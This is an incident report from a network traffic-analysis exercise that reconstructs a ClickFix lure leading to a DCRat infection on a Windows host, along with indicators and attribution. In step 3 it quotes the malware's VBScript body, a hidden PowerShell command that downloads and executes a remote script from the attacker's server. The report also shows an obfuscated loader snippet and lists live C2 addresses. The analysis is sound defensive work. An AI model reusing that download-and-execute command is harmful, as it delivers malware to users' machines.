## Incident Report — MTA 2025-01-22 Traffic Analysis Exercise

**Capture:** `2025-01-22-traffic-analysis-exercise.pcap` (39,427 frames, single internal host: 10.1.17.215)

### Victim host
| Field | Value | Evidence |
|---|---|---|
| IPv4 | 10.1.17.215 | dominant conversation endpoint in every flow |
| MAC | 00:d0:b7:26:4a:74 | ARP (`arp.src.proto_ipv4==10.1.17.215`) and DHCP request |
| Hostname | DESKTOP-L8C5GSJ (AD domain `bluemoontuesday.com`, DC `WIN-GSH54QLW48D.bluemoontuesday.com`) | DHCP option 12 hostname; NBNS name registrations; DNS queries for `DESKTOP-L8C5GSJ.bluemoontuesday.com` |
| Logged-in user | shutchenson | `kerberos.CNameString` on Kerberos AS-REQ/TGS-REQ traffic to the DC |

### Infection chain (reconstructed from timestamps)
1. **t=38–39s** — Host resolves `google-authenticator.burleson-appliance.net` (Cloudflare, 104.21.x.x) then `authenticatoor.org` (82.221.136.26) — a typosquatted "Google Authenticator" page and a fake verification/CAPTCHA landing page, the classic **ClickFix** social-engineering pattern (paste-and-run a "verification" command via Win+R).
2. **t=52s** — Host resolves `appointedtimeagriculture.com` (217.70.186.109), consistent with a compromised third-party site used as a redirect hop in the same lure chain.
3. **t=60s** — `GET http://5.252.153.241/api/file/get-file/264872` (frame 5031, MSIE7/mshta-style UA) retrieves an HTA/COM scriptlet (SHA256 `c74123dbccded43fda61651e102750b041d4c3af6fda88cd6436f9276653e103`). Its VBScript body:
   ```
   objShell.Run("cmd /c start /min powershell -NoProfile -WindowStyle Hidden -Command
   ""start-process 'https://azure.microsoft.com';
   iex (new-object System.Net.WebClient).DownloadString('http://5.252.153.241:80/api/file/get-file/29842.ps1');
   #URL: https://teams.microsoft.com""")
   ```
   This opens a decoy Microsoft page while silently fetching and executing the next stage — the clipboard-paste payload dropped by the ClickFix lure.
4. Obfuscated PowerShell loaders `29842.ps1` and `pas.ps1` (both Base64-with-junk-character-stripping obfuscation, `iex ([system.text.encoding]::UTF8.GetString(...FromBase64String...`) are pulled from the same host.
5. The implant begins polling `http://5.252.153.241/1517096937` (a fixed numeric bot/client ID) hundreds of times over the session, and reports task status back via query string, e.g. `?k=message = startup shortcut created; status = success;` and `?k=script: RunRH, status: OK, message: PS process started`.
6. The implant retrieves a legitimate signed **TeamViewer QuickSupport** package (`TeamViewer`, `Teamviewer_Resource_fr`, `TV`) from the same C2 and silently launches it — abusing a real remote-support tool as a hands-on-keyboard access channel (this is a known DCRat "TeamViewer" plugin behavior). At t≈611s the host performs TeamViewer DynGate ID registration against the legitimate `master16.teamviewer.com` (185.188.32.26).
7. From t≈889s onward the host opens sustained, high-volume TLS sessions to `45.125.66.32:2917` (bare-IP SNI `45.125.66.32`, non-standard port, ~9.6 MB transferred — consistent with a live interactive C2/exfil channel) and `45.125.66.252:443` (no SNI, same /24 as the first), both in the same hosting block as the initial payload server.

### Malware family
**DCRat (DarkCrystal RAT)** — **behavioral attribution** (no AV/YARA signature check was performed against the extracted binaries; no internet lookups were used). The call is based on the combination of TTPs observed in traffic: fixed numeric client-ID polling on an HTTP root path with `?k=` status callbacks, a `/api/file/get-file/<id>` plugin/file staging API, a `RunRH` plugin-execution status message, silent deployment of a bundled legitimate TeamViewer build as a remote-access plugin, and Base64/junk-character-obfuscated PowerShell stagers — all consistent with documented DCRat plugin architecture and loader style.

### Benign context (not IOCs)
Windows Update / Delivery Optimization (`*.windowsupdate.com`, `*.dsp.mp.microsoft.com`), Microsoft 365/Teams/Edge/Bing/MSN telemetry, LDAP/Kerberos/DCE-RPC/NBNS/LLMNR/mDNS domain traffic to `bluemoontuesday.com`/DC, NTP pools, and CDN traffic (Akamai `23.x`) are normal enterprise/OS noise.
